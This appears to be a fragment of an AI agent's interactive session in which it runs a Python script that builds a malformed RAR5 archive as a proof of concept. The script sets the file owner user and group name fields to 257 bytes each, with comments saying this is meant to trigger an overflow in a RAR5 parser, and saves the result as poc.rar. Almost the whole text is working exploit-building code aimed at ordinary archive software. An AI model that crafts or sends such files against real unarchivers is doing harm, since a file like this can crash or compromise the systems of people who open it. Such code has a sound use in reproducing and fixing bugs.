Running Python code interactively: import struct
import zlib

def encode_varint(value):
    """Encode a value as RAR5-style varint (little-endian, 7 bits per byte, MSB=continuation)"""
    result = bytearray()
    while value >= 0x80:
        result.append((value & 0x7F) | 0x80)
        value >>= 7
    result.append(value & 0x7F)
    return bytes(result)

def build_rar5_poc():
    # RAR5 magic: "Rar!\x1a\x07\x01\x00"
    magic = b"Rar!\x1a\x07\x01\x00"
    
    # ===== MAIN base block =====
    # The header data (covered by CRC) includes: header_size varint + header_id + header_flags + header_specific
    main_header_specific = bytearray()
    # archive_flags: no special flags (0)
    main_header_specific.extend(encode_varint(0))
    
    # header_id, header_flags
    main_header_id = encode_varint(0x01)  # HEAD_MAIN
    main_header_flags = encode_varint(0x00)
    
    # raw_hdr_size = size of everything after the header_size varint
    main_raw_data = main_header_id + main_header_flags + bytes(main_header_specific)
    main_raw_hdr_size = len(main_raw_data)
    main_hdr_size_varint = encode_varint(main_raw_hdr_size)
    main_hdr_size_len = len(main_hdr_size_varint)
    
    # Data covered by CRC: header_size varint + header_id + header_flags + header_specific
    main_crc_data = main_hdr_size_varint + main_raw_data
    main_crc = zlib.crc32(main_crc_data) & 0xFFFFFFFF
    
    main_base = struct.pack('<I', main_crc) + main_hdr_size_varint + main_raw_data
    
    # ===== FILE base block =====
    file_header_specific = bytearray()
    
    # Build the extra field data for EX_UOWNER
    extra_data_payload = bytearray()
    # flags: OWNER_USER_NAME (0x01) | OWNER_GROUP_NAME (0x02)
    owner_flags = 0x01 | 0x02
    extra_data_payload.extend(encode_varint(owner_flags))
    
    # OWNER_USER_NAME: value_len > 256 to trigger overflow
    user_name_len = 257
    extra_data_payload.extend(encode_varint(user_name_len))
    extra_data_payload.extend(b'A' * user_name_len)
    
    # OWNER_GROUP_NAME: value_len > 256
    group_name_len = 257
    extra_data_payload.extend(encode_varint(group_name_len))
    extra_data_payload.extend(b'B' * group_name_len)
    
    # Extra field: extra_field_size (varint), extra_field_id (varint), payload
    extra_field = bytearray()
    extra_field.extend(encode_varint(len(extra_data_payload)))  # extra_field_size
    extra_field.extend(encode_varint(0x06))  # extra_field_id = EX_UOWNER
    extra_field.extend(extra_data_payload)
    
    extra_data_size = len(extra_field)
    file_header_specific.extend(encode_varint(extra_data_size))  # extra_data_size
    
    # data_size (HFL_DATA is set)
    data_size = 0
    file_header_specific.extend(encode_varint(data_size))
    
    # file_flags: no special flags
    file_header_specific.extend(encode_varint(0x00))
    
    # unpacked_size
    file_header_specific.extend(encode_varint(0))
    
    # file_attr
    file_header_specific.extend(encode_varint(0x0000))
    
    # compression_info: method=0, version=0
    file_header_specific.extend(encode_varint(0))
    
    # host_os = HOST_UNIX (1)
    file_header_specific.extend(encode_varint(1))
    
    # name_size and name
    file_name = b"test.txt"
    file_header_specific.extend(encode_varint(len(file_name)))
    file_header_specific.extend(file_name)
    
    # Append the extra field data
    file_header_specific.extend(extra_field)
    
    # header_id, header_flags
    file_header_id = encode_varint(0x02)  # HEAD_FILE
    file_header_flags = encode_varint(0x0003)  # HFL_EXTRA_DATA | HFL_DATA
    
    file_raw_data = file_header_id + file_header_flags + bytes(file_header_specific)
    file_raw_hdr_size = len(file_raw_data)
    file_hdr_size_varint = encode_varint(file_raw_hdr_size)
    
    file_crc_data = file_hdr_size_varint + file_raw_data
    file_crc = zlib.crc32(file_crc_data) & 0xFFFFFFFF
    
    file_base = struct.pack('<I', file_crc) + file_hdr_size_varint + file_raw_data
    
    # ===== ENDARC base block =====
    endarc_header_specific = bytearray()
    endarc_header_id = encode_varint(0x05)  # HEAD_ENDARC
    endarc_header_flags = encode_varint(0x00)
    
    endarc_raw_data = endarc_header_id + endarc_header_flags + bytes(endarc_header_specific)
    endarc_raw_hdr_size = len(endarc_raw_data)
    endarc_hdr_size_varint = encode_varint(endarc_raw_hdr_size)
    
    endarc_crc_data = endarc_hdr_size_varint + endarc_raw_data
    endarc_crc = zlib.crc32(endarc_crc_data) & 0xFFFFFFFF
    
    endarc_base = struct.pack('<I', endarc_crc) + endarc_hdr_size_varint + endarc_raw_data
    
    # Combine everything
    poc = magic + main_base + file_base + endarc_base
    return poc

poc = build_rar5_poc()
print(f"PoC size: {len(poc)} bytes")

with open('/workspace/poc.rar', 'wb') as f:
    f.write(poc)
print("Saved to /workspace/poc.rar")
